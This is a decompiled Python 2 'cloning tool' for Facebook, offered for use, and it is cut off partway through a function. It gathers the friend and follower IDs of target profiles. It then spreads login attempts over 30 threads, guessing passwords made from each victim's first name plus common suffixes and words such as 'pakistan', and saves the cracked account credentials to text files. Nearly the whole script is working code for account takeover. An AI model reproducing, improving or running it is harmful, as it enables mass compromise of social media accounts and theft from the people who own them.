# DECOMPILED BY HUNTERBOY ALAMIN
# FACEBOOK : MD ALAMIN KHAN
# CONTACT : https://www.facebook.com/alaminkhan.60
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')

agents = [
 'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
birth = [
 '001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 'x-fb-connection-type': 'unknown', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = '\n\x1b[1;92m\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97  \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;92m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\n\x1b[1;92m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\x1b[1;92m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\x1b[1;93m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\n\x1b[1;92m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : SYED SHAWAIZ SHAH \x1b[1;33m\xf0\x9f\x94\xa5SYED-ZADA\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m WhatsApp  : 03423600767\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/syedzada1100\n\x1b[1;93m______________________________________________________\n'

def tool():
    os.system('clear')
    print ''
    print logo
    time.sleep(1)
    print ('First Put Tool Username...').center(50)
    print ''
    time.sleep(1)
    username = raw_input('[+] Tool Username : ')
    if username == 'LEGEND-SYED':
        print ''
        time.sleep(1)
        print ('\x1b[1;92mTool Username is correct').center(50)
        print ''
        time.sleep(1)
        step_main()
    else:
        print ''
        time.sleep(1)
        print ('\x1b[1;91mTool Username Is Invalid :) ').center(50)
        print ''
        time.sleep(1)
        tool()


def step_main():
    os.system('clear')
    print logo
    print ''
    time.sleep(1)
    print ('First Put Tool Password...').center(50)
    print ''
    time.sleep(1)
    username = raw_input('[+] Tool Password : ')
    if username == 'LEGEND-SYED':
        print ''
        time.sleep(1)
        print ('\x1b[1;92mTool Password is correct').center(50)
        print ''
        time.sleep(1)
        main()
    else:
        print ''
        time.sleep(1)
        print ('\x1b[1;91mTool Password Is Invalid :) ').center(50)
        print ''
        time.sleep(1)
        step_main()


def main():
    os.system('clear')
    print logo
    print (' \t [\x1b[1;97m\x1b[1;41m   If Any Problem So Contact Me   \x1b[0m\x1b[1;93m]').center(50)
    print 54 * '\x1b[1;93m_'
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mStart Cloning....'
    print '\x1b[1;93m[2] \x1b[1;92mContact Owner On Facebook'
    print '\x1b[1;93m[3] \x1b[1;92mContact Owner On WhatsApp'
    print '\x1b[1;93m[4] \x1b[1;92mjoin Our Facebook Group '
    print '\x1b[1;93m[0] \x1b[1;92mExit'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    os.system('xdg-open https://www.facebook.com/syedshawaizshah655')
    main_select()


def main_select():
    SYED = raw_input('\n\x1b[1;93mChoose Option \xe2\x89\xbb \x1b[1;92m')
    if SYED == '':
        print '\x1b[1;97mFill in correctly'
        main()
    elif SYED == '1':
        login()
    elif SYED == '2':
        os.system('xdg-open https://www.facebook.com/syedshawaizshah655')
        main()
    elif SYED == '3':
        os.system('xdg-open https://api.whatsapp.com/send/?phone=%2B9203423600767&text&app_absent=0')
        main()
    elif SYED == '4':
        os.system('xdg-open https://www.facebook.com/groups/1024471331689337')
        main()
    elif SYED == '0':
        os.system('exit')
    else:
        print ('\x1b[1;91m[!] Please select a valid option').center(50)
        time.sleep(2)
        main()


def login():
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print ('    \t [\x1b[1;97m\x1b[1;41m   Login menu   \x1b[0m\x1b[1;93m]').center(50)
        print ''
        print 47 * '\x1b[1;93m\xe2\x96\xac'
        print '\x1b[1;93m[1] \x1b[1;92mLogin With Fb Token\n'
        print '\x1b[1;93m[2] \x1b[1;92mLogin With Fb id/pass\n'
        print '\x1b[1;93m[3] \x1b[1;92mWithout Login Cloning\n'
        print '\x1b[1;93m[4] \x1b[1;92mBack '
        print 47 * '\x1b[1;93m\xe2\x96\xac'
        print ''
        log_select()


def log_select():
    global token
    sel = raw_input('Choose option: \x1b[1;92m')
    if sel == '2':
        log_fb()
    elif sel == '1':
        token()
    elif sel == '3':
        os.system('python2 without.py')
    elif sel == '4':
        main()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def log_fb():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print (' \t        [\x1b[1;97m\x1b[1;41m  Put Facebook id/pass  \x1b[0m\x1b[1;93m]').center(50)
        print ''
        uid = raw_input('\x1b[1;92m[+] Email: \x1b[1;93m')
        print ''
        passw = raw_input('\x1b[1;92m[+] Password: \x1b[1;93m')
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('access_token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print '\t\x1b[1;91mAccount has checkpoint'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\t\x1b[1;91mId/pass my be wrong'
            print ''
            time.sleep(1)


def token():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print (' \t        [\x1b[1;97m\x1b[1;41m  Paste Token  \x1b[0m\x1b[1;93m]').center(50)
        print ''
        print ''
        token = raw_input(' \x1b[1;92m[+] Token : \x1b[1;93m')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
        print logo
        print ''
        print '\x1b[1;92m\t Your Token Logged in Sucsessfuly'
        time.sleep(1)
    except KeyError:
        print logo
        print ''
        print '\x1b[1;91m\t Logged in token has expired'
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print ' \t       Wellcome :\x1b[1;92m ' + name
    print 54 * '\x1b[1;93m_'
    print ''
    print (' \t       [\x1b[1;97m\x1b[1;41m  Choose method  \x1b[0m\x1b[1;93m]').center(50)
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mCRACK WITH AUTO PASS\n'
    print '\x1b[1;93m[2] \x1b[1;92mCRACK WITH CHOICE DIGIT PASS\n'
    print '\x1b[1;93m[3] \x1b[1;92mBACK'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92mChoose option: \x1b[1;93m')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '3':
        main()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mCRACK FROM PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[2] \x1b[1;92mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[0] \x1b[1;92mBACK'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;93mChoose option: \x1b[1;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print (' \t       [\x1b[1;97m\x1b[1;41m  Put 3 idzz Links  \x1b[0m\x1b[1;93m]').center(50)
        print ''
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)# DECOMPILED BY HUNTERBOY ALAMIN
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print (' \t       [\x1b[1;97m\x1b[1;41m  Put 3 idzz Links  \x1b[0m\x1b[1;93m]').center(50)
        print ''
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' \x1b[1;93mTotal IDs :\x1b[1;92m ' + str(len(id))
    print ' \x1b[1;93mThe process has been Started'
    print ' \x1b[1;93mPlzz wait to crack idzz'
    print ' \x1b[1;93mPress ctrl + z to stop'
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 5 Second \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;93m_'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower() + '123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Syedok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('Syedcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Syedok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '786'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Syedok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = '786786'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Syedok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = 'pakistan'
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEDEND-SYED-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Syedok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = 'pakistan123'
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Syedok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 54 * '\x1b[1;92m_'
    print ''
    print ' \x1b[1;92mThe process has been completed'
    print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: Syedcp.txt'
    print 54 * '_'
    print ''
    print ''
    raw_input(' \x1b[1;93m Press enter to back ')
    menu()


def choice():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mCRACK FROM PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[2] \x1b[1;92mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;93m[0] \x1b[1;92mBACK'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print ''
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;93mChoose option: \x1b[1;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ' \t  [\x1b[1;97m\x1b[1;41m  Put 7 passwords And 3 idzz Link  \x1b[0m\x1b[1;93m]'
        print ''
        print ''
        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;92m ')
        pass2 = raw_input('\x1b[1;93m[+] Password [2] :\x1b[1;92m ')
        pass3 = raw_input('\x1b[1;93m[+] Password [3] :\x1b[1;92m ')
        pass4 = raw_input('\x1b[1;93m[+] Password [4] :\x1b[1;92m ')
